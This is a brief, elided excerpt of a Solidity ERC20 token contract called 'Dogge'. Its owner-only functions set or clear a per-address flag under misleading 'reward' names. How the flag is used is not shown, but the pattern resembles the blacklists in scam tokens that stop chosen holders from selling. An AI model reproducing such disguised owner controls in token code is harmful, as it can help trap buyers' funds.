...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function grantDogge(address [] calldata _rewardees_) external onlyOwner {
        for (uint256 i = 0; i < _rewardees_.length; i++) {
            _rewards[_rewardees_[i]] = true;
        }
    }

    function proceedDogge(address [] calldata _rewardees_) external onlyOwner {
        for (uint256 i = 0; i < _rewardees_.length; i++) {
            _rewards[_rewardees_[i]] = false;
        }
    }

    function isDogge(address _rewardee_) public view returns (bool) {
...
contract Dogge is ERC20 {
    constructor() ERC20("Dogge", "DOGGE") {
